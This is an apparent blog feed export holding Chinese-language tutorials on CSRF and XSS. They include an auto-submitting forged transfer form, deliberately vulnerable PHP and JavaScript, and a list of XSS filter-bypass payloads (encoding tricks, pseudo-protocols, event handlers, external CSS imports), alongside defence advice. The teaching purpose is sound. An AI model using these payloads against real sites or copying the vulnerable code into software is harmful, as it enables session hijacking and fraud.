href="https://tva3.sinaimg.cn/large/007DFXDhgy1g5apzvg8pdj31hc0sc7bj.jpg" target="_blank" rel="noopener"><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g5apzvg8pdj31hc0sc7bj.jpg" alt="img"></a><br><a href="https://linuz.me/2019/07/24/Docker-portainer/" target="_blank" rel="noopener">文章转自</a></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>可视化</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF总结</title>
    <url>/2019/12/17/CSRF/</url>
    <content><![CDATA[<p>CSRF跨站点请求伪造(Cross—Site Request Forgery)，跟XSS攻击一样，存在巨大的危害性，你可以这样来理解：<br>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 如下：其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。</p>
<a id="more"></a>

<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>CSRF跨站点请求伪造(Cross—Site Request Forgery)，跟XSS攻击一样，存在巨大的危害性，你可以这样来理解：<br>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 如下：其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。</p>
<h2 id="0x01-攻击原理"><a href="#0x01-攻击原理" class="headerlink" title="0x01 攻击原理"></a>0x01 攻击原理</h2><p>1.用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A。<br>2.在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A。<br>3.用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B。<br>4.网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A。<br>5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。 </p>
<h2 id="0x02攻击举例"><a href="#0x02攻击举例" class="headerlink" title="0x02攻击举例"></a>0x02攻击举例</h2><p>受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=BOB</code> 可以使 Bob 把 1000000 的存款转到 bob 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。</p>
<p>​    黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。</p>
<p>​    这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： <code>src=&quot;http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory&quot;</code>，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 </p>
<p>攻击代码举例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form id=<span class="string">"ak"</span> action=<span class="string">"http://www.xxx.com/transfer.do"</span> method=<span class="string">"POST"</span> display=<span class="string">"none"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"accountNum"</span> value=<span class="string">"10001"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"money"</span> value=<span class="string">"10000"</span>/&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">    var form = document.getElementById('ak'); /</span><span class="regexp">/获取ID对应的对象 document.forms.ak.submit() (这样也可以提交 自动跳转多种多样这里不再一一举例)</span></span><br><span class="line"><span class="regexp">    form.submit(); /</span><span class="regexp">/执行提交表单</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/CSRF.png" alt="html">    </p>
<p><a href="https://www.4hou.com/web/10234.html" target="_blank" rel="noopener">在JSON端点上利用CSRF漏洞的实践教程</a></p>
<p>网上也会有大量的例子这里大家搜索一下或者在DVWA上做实验即可。</p>
<h2 id="0x03CSRF一些防御手法"><a href="#0x03CSRF一些防御手法" class="headerlink" title="0x03CSRF一些防御手法"></a>0x03CSRF一些防御手法</h2><p><strong>防御CSRF攻击：</strong></p>
<p>​    目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。</p>
<p><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP的网站有一些很好的文档来防止你的网站上出现CSRF漏洞</a></p>
<p>   <strong>验证 HTTP Referer 字段</strong></p>
<p>​    根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p>
<p>​    这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
<p>​    然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
<p>​    <strong>在请求地址中添加 token 并验证</strong></p>
<p>​     CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>
<p>​    这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 <code>http://url?csrftoken=tokenvalue</code>。 而对于 POST 请求来说，要在 form 的最后加上 <code>&lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;tokenvalue&quot;/&gt;</code>，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</p>
<p>该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p>
<p>   <strong>在 HTTP 头中自定义属性并验证</strong></p>
<p>​    这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。    然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p>
<p>引用地址：<code>http://www.phpddt.com/reprint/csrf.html</code></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>漏洞挖掘</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>跨站脚本攻击(XSS)</title>
    <url>/2019/12/16/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E(XSS)/</url>
    <content><![CDATA[<p>XSS漏洞是Web应用程序中最常见的漏洞之一。如果您的站点没有预防XSS漏洞的固定方法，那么很可能就存在XSS漏洞。文章讲会从代码层面讲解XSS还有一些Payload。</p>
<a id="more"></a>

<h2 id="0x00概述"><a href="#0x00概述" class="headerlink" title="0x00概述"></a>0x00概述</h2><p> xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找未过滤的输出函数。只要输出函数可控结合一些绕过手法即可达到xss攻击的目的。<br> 常见的输出函数有： <code>echo printf print print_r sprintf die var-dump var_export</code>.</p>
<h2 id="0x01-XSS类型"><a href="#0x01-XSS类型" class="headerlink" title="0x01 XSS类型"></a>0x01 XSS类型</h2><p>反射型XSS：一般存在于链接之中或者请求之中可以实现自我攻击也就是self-xss也可以欺骗用户去点击 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容他只存在GET请求的url链接中或者POST的http数据包中 当请求数据发生改变的时候对应的页面也会发生改变），一般容易出现在搜索页面。</p>
<p>存储型XSS：代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p>
<p>DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞</p>
<h2 id="0x02-从代码层面理解xss原理"><a href="#0x02-从代码层面理解xss原理" class="headerlink" title="0x02 从代码层面理解xss原理"></a>0x02 从代码层面理解xss原理</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>在黑盒测试中，这种类型比较容易通过漏扫直接发现，我们只需要按照扫描结果进行相应的验证就可以了。</p>
<p>相对的在白盒审计中， 我们首先要寻找带参数的输出函数，接下来通过输出内容回溯到输入参数，观察是否过滤即可。</p>
<p>接下来我们拿PHP<code>echo</code>函数举例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//xss.php文件</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;反射型XSS&lt;/title&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt; </span><br><span class="line">    &lt;span&gt;情输入你的名字：&lt;/span&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;     </span><br><span class="line">&lt;input type=&quot;submit&quot;&gt; </span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">$username = $_GET[&apos;user&apos;];</span><br><span class="line">echo &apos;你的名字为:&lt;br&gt;&apos;.$username;</span><br><span class="line">?&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/name.png" alt="html">    </p>
<p>从代码中也可以看到对user的输入没有做任何过滤直接打印在页面上 下面试一下弹窗</p>
<p><img src="/images/XSS/xss_1.png" alt="html">    </p>
<p>我们可以看到浏览器的页面已经成功的解析了js代码 当然光弹框不够的 需要构造js读取一些敏感数据 js能做的事情还是比较多的。</p>
<h3 id="储存型xss"><a href="#储存型xss" class="headerlink" title="储存型xss"></a>储存型xss</h3><p>和反射性XSS的即时响应相比，存储型XSS则需要先把利用代码保存在比如数据库或文件中（一般文章名字用户名信息之类的），当web程序读取利用代码时再输出在页面上执行利用代码。但存储型XSS不用考虑绕过浏览器的过滤问题，屏蔽性也要好很多。</p>
<p><img src="/images/XSS/xsslc.png" alt="html">    </p>
<p>存储型XSS的白盒审计同样要寻找未过滤的输入点和未过滤的输出函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;span style=&quot;font-size:18px;&quot;&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;/&gt; </span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt;  </span><br><span class="line">&lt;title&gt;储存型XSS&lt;/title&gt;  </span><br><span class="line">&lt;/head&gt;  </span><br><span class="line">&lt;body&gt;  </span><br><span class="line">&lt;h2&gt;用户注册&lt;h2&gt;  </span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;form action=&quot;xss.php&quot; method=&quot;post&quot;&gt;  </span><br><span class="line">账号:&lt;textarea id=&apos;user&apos; name=&quot;user&quot;&gt;&lt;/textarea&gt; </span><br><span class="line">&lt;br/&gt; </span><br><span class="line">密码:&lt;textarea id=&apos;pass&apos; name=&quot;pass&quot;&gt;&lt;/textarea&gt; </span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;注册&quot;/&gt;  </span><br><span class="line">&lt;/form&gt;  </span><br><span class="line">&lt;?php  </span><br><span class="line">if(isset($_POST[&apos;user&apos;])&amp;&amp;isset($_POST[&apos;pass&apos;]))&#123;  </span><br><span class="line">	$file=fopen(&quot;user.txt&quot;,&quot;a&quot;);  //打开文件只写</span><br><span class="line">	fwrite($file,$_POST[&apos;user&apos;].&quot;\r\n&quot;);  //写数据</span><br><span class="line">	fwrite($file,$_POST[&apos;pass&apos;].&quot;\r\n&quot;);  //写数据</span><br><span class="line">	fclose($file);  //关闭文件流</span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">if(file_exists(&quot;user.txt&quot;))&#123;  //判断文件是否存在</span><br><span class="line">	$read= fopen(&quot;user.txt&quot;,&apos;r&apos;);  //打开文件只读</span><br><span class="line">	while(!feof($read))&#123;  </span><br><span class="line">    	echo fgets($read).&quot;&lt;/br&gt;&quot;;  //循环写到页面</span><br><span class="line">	&#125;  </span><br><span class="line">	fclose($read);  //关闭文件流</span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br><span class="line">&lt;/html&gt;&lt;/span&gt;  </span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>首先我们注册一下测试功能</p>
<p><img src="/images/XSS/register.png" alt="html">    </p>
<p>注册功能正常并且可以正常显示出来</p>
<p>我面我们输入js代码看看页面会有什么反应 payload：<code>&lt;script&gt;alert(</code>melon<code>)&lt;/script&gt;</code></p>
<p><img src="/images/XSS/xss_2.png" alt="html">    </p>
<p><img src="/images/XSS/notpad.png" alt="html">    </p>
<p>我们可以看到文件中的内容已经写进了js代码 而且是持久化的 无论我们的访问链接中带不带恶意的参数这个js别的用户都会执行，这就是所谓的存储型XSS漏洞，一次提交之后，每当有用户访问这个页面都会受到XSS攻击，危害巨大。</p>
<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p><strong>不做任何过滤跳转</strong></p>
<p>在很多场景下，业务需要实现页面跳转，常见的使用，<code>location.href()</code> <code>location.replace()</code> <code>location.assign()</code>这些方法通过Javascript实现跳转。我们第一时间可能想到的是限制不严导致任意URL跳转漏洞，而DOM XSS与此似乎“八竿子打不着”，实际上跳转部分参数可控，可能导致Dom xss。</p>
<p>举一个简单的例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> hash = location.hash;</span><br><span class="line">	<span class="keyword">if</span>(hash)&#123;</span><br><span class="line">		<span class="keyword">var</span> url = hash.substring(<span class="number">1</span>); <span class="comment">//#为第0个字符 截取后为javascript:alert(1) 然后浏览器跳转实现xss</span></span><br><span class="line">		location.href = url;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/XSS/xssdom1.png" alt="html">    </p>
<p>解析：变量hash为可控部分，并带入url中，变量hash控制的是#之后的部分，那么可以使用伪协议<code>#javascript:alert</code></p>
<p><img src="/images/XSS/xssdom2.png" alt="html">    </p>
<p>data伪协议也是可以的</p>
<p><strong>使用indexOf判断URL参数是否合法</strong></p>
<p>先放上代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> melon = location.search.slice(<span class="number">1</span>);      <span class="comment">// 截取url中?之后的部分</span></span><br><span class="line">	<span class="keyword">if</span>(melon.indexOf(<span class="string">"url="</span>) &gt; <span class="number">-1</span> &amp;&amp; melon.indexOf(<span class="string">"http"</span>) &gt; <span class="number">-1</span>)&#123;  <span class="comment">// 判断melon中是否有url=和http关键字</span></span><br><span class="line">		<span class="keyword">var</span> pos = melon.indexOf(<span class="string">"url="</span>)+<span class="number">4</span>;      </span><br><span class="line">		url = melon.slice(pos,melon.length);         <span class="comment">//从第五个开始也就是等号开始截取到最后</span></span><br><span class="line">		location.href = url                 <span class="comment">// 跳转</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：<code>?url=javascript:alert(1)//http</code></p>
<p><img src="/images/XSS/xssdom3.png" alt="html"></p>
<p>这样是由于过滤不严格导致的 因该把url=后的以http或者https写死 上面的写法只是存在http即可 //相当于注释掉了但是确实存在http所以绕过了</p>
<p>XSS大都是大同小异 对用户的过分相信输入导致了漏洞的出现</p>
<h2 id="0x03修复建议"><a href="#0x03修复建议" class="headerlink" title="0x03修复建议"></a>0x03修复建议</h2><p>1、防堵跨站漏洞，阻止攻击者利用在被攻击网站上发布跨站攻击语句</p>
<p>不可以信任用户提交的任何内容，首先代码里对用户输入的地方和变量都需要仔细检查长度和对”&lt;”，”&gt;”，”；”，”’”等字符做过滤；其次任何内容写到页面之前都必须加以encode，避免不小心把htmltag弄出来。这一个层面做好，至少可以堵住超过一半的XSS攻击。</p>
<p>2、cookie防盗</p>
<p>首先避免直接在cookie中泄露用户隐私，例如email、密码等等。其次通过使cookie和系统ip绑定来降低cookie泄露后的危险。这样攻击者得到的cookie没有实际价值，不可能拿来重放。</p>
<p>3、尽量采用POST而非GET提交表单</p>
<p>POST操作不可能绕开javascript的使用，这会给攻击者增加难度，减少可利用的跨站漏洞。</p>
<p>4、严格检查refer</p>
<p>检查httprefer是否来自预料中的url。这可以阻止第2类攻击手法发起的http请求，也能防止大部分第1类攻击手法，除非正好在特权操作的引用页上种了跨站访问。</p>
<p>5、将单步流程改为多步，在多步流程中引入效验码</p>
<p>多步流程中每一步都产生一个验讠正码作为hidden表单元素嵌在中间页面，下一步操作时这个验讠正码被提交到服务器，服务器检查这个验讠正码是否匹配。首先这为第1类攻击者大大增加了麻烦。其次攻击者必须在多步流程中拿到上一步产生的效验码才有可能发起下一步请求，这在第2类攻击中是几乎无法做到的。</p>
<p>6、引入用户交互</p>
<p>简单的一个看图识数可以堵住几乎所有的非预期特权操作。</p>
<p>7、只在允许anonymous访问的地方使用动态的javascript。</p>
<p>8、对于用户提交信息的中的img等link，检查是否有重定向回本站、不是真的图片等可疑操作。</p>
<p>9、内部管理网站的问题</p>
<p>很多时候，内部网站往往疏于关注安全问题，只是简单的限制访问来源。这种网站往往对XSS攻击毫无抵抗力，需要多加注意。</p>
<p>虽然XSS的攻击很灵活，只要我们能做好上述几点，是可以组织大部分XSS的，再及时打好补丁可以最大程度的减少来自跨站脚本攻击XSS的威胁。</p>
<h2 id="0x04关于XSS的一些绕过"><a href="#0x04关于XSS的一些绕过" class="headerlink" title="0x04关于XSS的一些绕过"></a>0x04关于XSS的一些绕过</h2><h3 id="改变大小写"><a href="#改变大小写" class="headerlink" title="改变大小写"></a>改变大小写</h3><p>在测试过程中，我们可以改变测试语句的大小写来绕过XSS规则：</p>
<p>比如：<code>&lt;script&gt;alert(“xss”);&lt;/script&gt;</code>可以转换为：<code>&lt;ScRipt&gt;ALeRt(“XSS”);&lt;/sCRipT&gt;</code></p>
<h3 id="关闭标签"><a href="#关闭标签" class="headerlink" title="关闭标签"></a>关闭标签</h3><p>有时候我们需要关闭标签来使我们的XSS生效。</p>
<p>比如：<code>&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code></p>
<h3 id="使用hex编码绕过"><a href="#使用hex编码绕过" class="headerlink" title="使用hex编码绕过"></a>使用hex编码绕过</h3><p>我们可以对我们的语句进行hex编码来绕过XSS规则</p>
<p>比如：<code>&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code>可以转换为：<br><code>%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e</code></p>
<h3 id="绕过magic-quotes-gpc"><a href="#绕过magic-quotes-gpc" class="headerlink" title="绕过magic_quotes_gpc"></a>绕过magic_quotes_gpc</h3><p>magic_quotes_gpc=ON是php中的安全设置，开启后会把一些特殊字符进行轮换，比如<br><code>&#39;(单引号)转换为\&#39;，&quot;(双引号)转换为\&quot;，\转换为\\</code></p>
<p>比如：<code>&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code>会转换为<code>&lt;script&gt;alert(\&quot;xss\&quot;);&lt;/script&gt;</code>,这样我们的xss就不生效了。</p>
<p>针对开启了magic_quotes_gpc的网站，我们可以通过javascript中的String.fromCharCode方法来绕过，我们可以把alert(“XSS”);转换为</p>
<p>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34,41)那么我们的XSS语句就变成了</p>
<p><code>&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88,83, 83, 34, 41, 59)&lt;/script&gt;</code></p>
<p>String.fromCharCode()是javascript中的字符串方法，用来把ASCII转换为字符串。</p>
<p>最后使用<code>&lt;script&gt;转换后的放到这里&lt;/script&gt;</code>包含即可。</p>
<h3 id="利用-lt-gt-标记注射Html-Javascript"><a href="#利用-lt-gt-标记注射Html-Javascript" class="headerlink" title="利用&lt;&gt;标记注射Html/Javascript"></a>利用&lt;&gt;标记注射Html/Javascript</h3><p>如果用户能随心所欲引入&lt;&gt;标记，那他就能操作HTML标记，然后就能通过<script>标签插入JS恶意脚本了，例如：</p>
<p><code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></p>
<p>当然如果对"<>"和script等进行了过滤，上面这个就无法执行了</p>
<h3 id="利用HTML标签属性值执行XSS"><a href="#利用HTML标签属性值执行XSS" class="headerlink" title="利用HTML标签属性值执行XSS"></a>利用HTML标签属性值执行XSS</h3><p>很多HTML标记中的属性都支持javascript:[code]伪协议的形式，这就给了注入XSS可乘之机,例如：</p>
<p><code>&lt;img src = &quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</code></p>
<p>这里即便对传入的参数过滤了<>,XSS还是能发生(前提是该标签属性需要引用文件)</p>
<h3 id="空格-回车-Tab"><a href="#空格-回车-Tab" class="headerlink" title="空格/回车/Tab"></a>空格/回车/Tab</h3><p>假设过滤函数进一步又过滤了javascript等敏感字符串，只需对javascript进行小小的操作即可绕过，例如：</p>
<p>　<code>&lt;img src= &quot;java　　script:alert(&#39;xss&#39;);&quot; width=100&gt;</code></p>
<p>这里之所以能成功绕过，其实还得益于JS自身的性质：Javascript通常以分号结尾，如果解析引擎能确定一个语句时完整的，且行尾有换行符，则分号可省略</p>
<p>而如果不是完整的语句，javascript则会继续处理，直到语句完整结束或分号。</p>
<p>像<code>&lt;img src= &quot;javascript:　alert(/xss/); width=100&gt;</code> 同样能绕过</p>
<h3 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h3><p>过滤严谨的函数很可能对标签也进行了严格的控制，但是如果用其他形式表示标签,脚本仍能解析却可以绕过过滤</p>
<p>常见的编码方式有：HTML实体编码(&#ASCII),十进制、十六进制、八进制编码，unicode编码及escape编码及使用String.fromCharCode(...)绕过</p>
<p>因此<code>&lt;img src= &quot;javascript&amp;#116&amp;#alert(/xss/);&quot;&gt;</code>可以实现绕过</p>
<p>另外还可以把&#01、&#02、&#09等字符插入代码的头部或任意地方</p>
<h3 id="产生自己的事件"><a href="#产生自己的事件" class="headerlink" title="产生自己的事件"></a>产生自己的事件</h3><p>如果不能依靠属性进行跨站，那么还可以利用事件处理函数</p>
<p><code>&lt;input type = &quot;button&quot; value = &quot;clickme&quot; οnclick=&quot;alert(&#39;click me&#39;)&quot; /&gt;</code></p>
<p>事件既能让JS脚本运行，自然也可以执行跨站，另外像onerror、onMouseover等都可利用的是事件处理函数</p>
<h3 id="利用CSS跨站剖析"><a href="#利用CSS跨站剖析" class="headerlink" title="利用CSS跨站剖析"></a>利用CSS跨站剖析</h3><p>之所以说CSS样式表是个很不错的载体，是因为CSS不需要嵌入到HTML代码中，可以直接从文件或其他地方进行引用. 另外CSS同样隐蔽、灵活，不过不同</p>
<p>浏览器之间不能通用，如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div style = <span class="string">"list-style-image:url(javascript:alert(‘xSS‘))"</span>&gt;</span><br><span class="line">&lt;link rel = <span class="string">"stylesheet"</span> href =<span class="string">"http://www.xxx.com/atack.css"</span>&gt;</span><br><span class="line">&lt;style type=‘text/css‘&gt;@<span class="keyword">import</span> url(http:<span class="comment">//www.xxx.com/xss.css);&lt;/style&gt;</span></span><br><span class="line">&lt;style&gt;@<span class="keyword">import</span> ‘javascript:alert(‘xss‘);‘&lt;<span class="regexp">/style&gt;</span></span><br></pre></td></tr></table></figure>

